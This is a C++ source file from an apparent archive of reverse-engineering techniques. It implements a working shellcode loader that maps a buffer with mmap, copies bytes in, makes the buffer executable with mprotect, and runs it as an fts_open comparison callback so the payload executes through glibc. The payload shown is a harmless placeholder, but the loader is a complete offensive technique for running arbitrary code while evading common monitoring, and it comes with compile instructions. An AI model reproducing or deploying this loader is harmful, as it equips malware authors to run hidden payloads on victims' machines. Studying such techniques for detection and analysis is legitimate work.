/*
    Shellcode Loader
    Archive of Reversing.ID

    Abusing glibc function to run shellcode as callback.

Compile:
    $ g++ code.cpp

Technique:
    - allocation: mmap
    - writing:    memcpy
    - permission: mprotect
    - execution:  fts_open + fts_read
*/

#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fts.h>
#include <string.h>
#include <stdint.h>

typedef int (*callback_t)(const FTSENT **, const FTSENT **);

int main ()
{
    void *      runtime;
    int         retval;
    FTS *       ftsp;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = mmap (0, payload_len, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);

    // copy payload to the buffer
    memcpy (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = mprotect (runtime, payload_len, PROT_READ|PROT_EXEC);

    if (retval == 0)
    {
        // preparation
        char * paths[2] = { ".", NULL };

        // attempt to open and read the directory hierarchy
        if (ftsp = fts_open (paths, FTS_NOCHDIR | FTS_PHYSICAL | FTS_SEEDOT, (callback_t) runtime))
        {    
            while (fts_read(ftsp) != NULL);
            fts_close (ftsp);
        }
    }

    // dealocate memory map
    munmap (runtime, payload_len);

    return 0;
}